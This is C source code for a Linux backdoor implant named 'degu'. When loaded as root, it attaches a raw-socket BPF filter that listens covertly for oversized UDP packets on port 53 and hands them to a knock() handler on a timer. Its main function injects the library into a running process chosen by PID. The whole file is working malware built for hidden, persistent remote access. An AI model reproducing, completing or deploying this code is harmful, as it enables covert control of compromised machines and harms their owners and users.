    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <signal.h>
    #include <stdarg.h>
    #include <linux/filter.h>
    #include <netinet/ip.h>
    #include <sys/time.h>
    #include <time.h>
    #include <net/ethernet.h>
    #include <string.h>
    #include <inttypes.h>
    #include <errno.h>
    #include <sys/stat.h>
    #include "degu.h"


    static int sock = -1;
    #ifdef PROD
    void trace(const char* format, ...);
    #else
    #define DEBUGLOG "/tmp/debug"
    void trace(const char* format, ...) {
        va_list param;
        struct timeval tv;
        struct tm *nowtm;
        time_t nowtime;
        char tmbuf[64], buf[512];

        gettimeofday(&tv, NULL);
        nowtime = tv.tv_sec;
        nowtm = localtime(&nowtime);
        strftime(tmbuf, sizeof tmbuf, "%H:%M:%S", nowtm);
        snprintf(buf, sizeof buf, "%s.%03ld", tmbuf, tv.tv_usec);
        FILE *out = fopen(DEBUGLOG,"a+");
        chmod(DEBUGLOG,0777);
    //    FILE *out = fopen("/dev/stdout","a+");
        va_start(param, format);
        fprintf(out, "(%d) %s: " , getpid(), buf);
        vfprintf(out, format, param);
        fprintf(out, "\n");
        va_end(param);
        fclose(out);
    }
    #endif
    int ghost_listen(){

        int s  = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

        if(s == -1 ){
            TRACE("[-] sock raw: %i %s\n", sock, strerror(errno));
        return -1;
        }

        struct sock_fprog filter;
        struct sock_filter BPF_code[] = {
            { 0x28, 0, 0, 0x0000000c },
            { 0x15, 0, 12, 0x00000800 },
            { 0x30, 0, 0, 0x00000017 },
            { 0x15, 0, 10, 0x00000011 },
            { 0x28, 0, 0, 0x00000014 },
            { 0x45, 8, 0, 0x00001fff },
            { 0xb1, 0, 0, 0x0000000e },
            { 0x48, 0, 0, 0x0000000e },
            { 0x15, 2, 0, 0x00000035 },
            { 0x48, 0, 0, 0x00000010 },
            { 0x15, 0, 3, 0x00000035 },
            { 0x80, 0, 0, 0x00000000 },
            { 0x35, 0, 1, PKTLEN_TRIGG },
            { 0x6, 0, 0, 0x00040000 },
            { 0x6, 0, 0, 0x00000000 },
        };

        filter.len = 15;
        filter.filter = BPF_code;

        if(setsockopt(s, SOL_SOCKET, SO_ATTACH_FILTER, &filter, sizeof(filter)) < 0) {
            TRACE("[-] bpf failed: %i %s\n", s, strerror(errno));
            return -1;
        }
        return s;
    }

    void sig_alrm(int signum){

        signal(SIGALRM,sig_alrm);
        alarm(WAKE);
        if(sock < 0)
            sock = ghost_listen();

        unsigned char p[1500] = {0};
        int i = 0;
        while( i != -1 ){
            i = recvfrom(sock, &p, 1500, MSG_DONTWAIT, NULL, NULL );
            if (i > PKTLEN_TRIGG )
                knock(p,i);
        }
    }


    DEGU_FUNC_INIT void degu(){
        if(getuid() != 0 || getenv(LIB_BYPASS) != NULL )
            return;

        setup_keys();
        signal(SIGALRM,sig_alrm);
        alarm(WAKE);
    }


    int main(int argc,char *argv[]){

        if (argc != 2)
            _exit(0);

        char dso[250] =  {0};
        readlink("/proc/self/exe",dso,250);
        pid_t target = atoi(argv[1]);

        TRACE("%s %i",dso,target);

        inject(target,dso);
        _exit(0);
    }
